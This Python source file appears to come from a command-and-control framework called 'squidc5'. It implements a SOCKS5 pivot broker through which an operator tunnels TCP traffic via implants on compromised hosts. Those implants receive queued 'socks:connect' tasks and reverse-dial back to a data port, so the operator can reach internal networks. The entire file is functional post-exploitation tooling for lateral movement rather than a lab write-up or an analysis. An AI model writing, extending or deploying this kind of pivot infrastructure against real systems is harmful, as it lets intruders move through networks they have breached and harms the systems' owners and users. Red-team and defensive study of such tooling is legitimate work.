"""SOCKS5 pivot: operator-facing proxy with implant reverse-dial relay."""

from __future__ import annotations

import asyncio
import logging
import secrets
import struct
from collections.abc import Awaitable, Callable
from dataclasses import dataclass, field
from typing import Any

log = logging.getLogger("squidc5.socks")

# Optional: queue implant task (session_id, command, args) -> None
TaskEnqueuer = Callable[[str, str, dict[str, Any]], Awaitable[None]]


@dataclass
class SocksPivot:
    id: str
    session_id: str
    listen_host: str = "127.0.0.1"
    listen_port: int = 0
    data_port: int = 0
    mode: str = "implant"  # implant | direct
    status: str = "pending"
    server: asyncio.AbstractServer | None = field(default=None, repr=False)
    data_server: asyncio.AbstractServer | None = field(default=None, repr=False)
    pending: dict[str, asyncio.Future] = field(default_factory=dict, repr=False)


class SocksBroker:
    """SOCKS5 broker: direct dial from C2, or implant reverse-dial bridge."""

    def __init__(self) -> None:
        self._pivots: dict[str, SocksPivot] = {}
        self.enqueue_task: TaskEnqueuer | None = None
        self.public_host: str = "127.0.0.1"

    def list(self) -> list[dict[str, Any]]:
        return [
            {
                "id": p.id,
                "session_id": p.session_id,
                "listen_host": p.listen_host,
                "listen_port": p.listen_port,
                "data_port": p.data_port,
                "mode": p.mode,
                "status": p.status,
            }
            for p in self._pivots.values()
        ]

    async def start(
        self,
        session_id: str,
        *,
        listen_host: str = "127.0.0.1",
        listen_port: int = 0,
        mode: str = "implant",
    ) -> dict[str, Any]:
        pid = f"socks_{secrets.token_hex(6)}"
        mode = mode if mode in ("implant", "direct") else "implant"
        pivot = SocksPivot(
            id=pid,
            session_id=session_id,
            listen_host=listen_host,
            listen_port=0,
            mode=mode,
            status="starting",
        )

        async def _data_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            """Implant opens data channel: first line = conn_id\\n then raw TCP bridge."""
            try:
                header = await asyncio.wait_for(reader.readline(), timeout=15.0)
                conn_id = header.decode("utf-8", errors="replace").strip()
                fut = pivot.pending.pop(conn_id, None)
                if fut and not fut.done():
                    fut.set_result((reader, writer))
                else:
                    writer.close()
                    await writer.wait_closed()
            except Exception:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

        data_server = None
        data_port = 0
        if mode == "implant":
            data_server = await asyncio.start_server(_data_handler, host="0.0.0.0", port=0)
            dsocks = list(data_server.sockets or [])
            data_port = int(dsocks[0].getsockname()[1]) if dsocks else 0
            pivot.data_server = data_server
            pivot.data_port = data_port
            asyncio.create_task(data_server.serve_forever(), name=f"socks-data-{pid}")

        async def _socks_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
            try:
                await self._handle_socks_client(pivot, reader, writer)
            except Exception as e:
                log.debug("socks client error: %s", e)
            finally:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

        server = await asyncio.start_server(_socks_handler, host=listen_host, port=listen_port)
        socks = list(server.sockets or [])
        port = int(socks[0].getsockname()[1]) if socks else listen_port
        pivot.server = server
        pivot.listen_port = port
        pivot.status = "listening"
        self._pivots[pid] = pivot
        asyncio.create_task(server.serve_forever(), name=f"socks-{pid}")

        hint_args: dict[str, Any] = {
            "pivot_id": pid,
            "socks_port": port,
            "data_port": data_port,
            "data_host": self.public_host,
            "mode": mode,
        }
        return {
            "id": pid,
            "session_id": session_id,
            "listen_host": listen_host,
            "listen_port": port,
            "data_port": data_port,
            "mode": mode,
            "status": "listening",
            "task_hint": {"command": "socks:start", "args": hint_args},
        }

    async def _handle_socks_client(
        self,
        pivot: SocksPivot,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        # greeting
        hdr = await asyncio.wait_for(reader.readexactly(2), timeout=10.0)
        ver, nmethods = hdr[0], hdr[1]
        if ver != 5:
            return
        await asyncio.wait_for(reader.readexactly(nmethods), timeout=10.0)
        writer.write(b"\x05\x00")  # no auth
        await writer.drain()

        req = await asyncio.wait_for(reader.readexactly(4), timeout=10.0)
        if req[0] != 5 or req[1] != 1:  # CONNECT
            writer.write(b"\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            return
        atyp = req[3]
        if atyp == 1:  # IPv4
            raw = await reader.readexactly(4)
            host = ".".join(str(b) for b in raw)
        elif atyp == 3:  # domain
            ln = (await reader.readexactly(1))[0]
            host = (await reader.readexactly(ln)).decode("utf-8", errors="replace")
        elif atyp == 4:  # IPv6
            raw = await reader.readexactly(16)
            host = ":".join(f"{raw[i]:02x}{raw[i+1]:02x}" for i in range(0, 16, 2))
        else:
            writer.write(b"\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            return
        port = struct.unpack("!H", await reader.readexactly(2))[0]

        if pivot.mode == "direct":
            try:
                r2, w2 = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=15.0)
            except Exception:
                writer.write(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
                await writer.drain()
                return
            writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            await self._pipe(reader, writer, r2, w2)
            return

        # implant reverse-dial
        conn_id = secrets.token_hex(8)
        loop = asyncio.get_running_loop()
        fut: asyncio.Future = loop.create_future()
        pivot.pending[conn_id] = fut
        if self.enqueue_task:
            try:
                await self.enqueue_task(
                    pivot.session_id,
                    "socks:connect",
                    {
                        "conn_id": conn_id,
                        "host": host,
                        "port": port,
                        "data_host": self.public_host,
                        "data_port": pivot.data_port,
                    },
                )
            except Exception as e:
                pivot.pending.pop(conn_id, None)
                log.warning("socks enqueue failed: %s", e)
                writer.write(b"\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00")
                await writer.drain()
                return
        try:
            implant_reader, implant_writer = await asyncio.wait_for(fut, timeout=45.0)
        except Exception:
            pivot.pending.pop(conn_id, None)
            writer.write(b"\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00")
            await writer.drain()
            return
        writer.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
        await writer.drain()
        await self._pipe(reader, writer, implant_reader, implant_writer)

    async def _pipe(
        self,
        a_r: asyncio.StreamReader,
        a_w: asyncio.StreamWriter,
        b_r: asyncio.StreamReader,
        b_w: asyncio.StreamWriter,
    ) -> None:
        async def copy(src: asyncio.StreamReader, dst: asyncio.StreamWriter) -> None:
            try:
                while True:
                    data = await src.read(65536)
                    if not data:
                        break
                    dst.write(data)
                    await dst.drain()
            except Exception:
                pass
            finally:
                try:
                    dst.close()
                except Exception:
                    pass

        await asyncio.gather(copy(a_r, b_w), copy(b_r, a_w))

    async def stop(self, pivot_id: str) -> bool:
        p = self._pivots.pop(pivot_id, None)
        if not p:
            return False
        for fut in list(p.pending.values()):
            if not fut.done():
                fut.cancel()
        p.pending.clear()
        for srv in (p.server, p.data_server):
            if srv:
                srv.close()
                await srv.wait_closed()
        return True
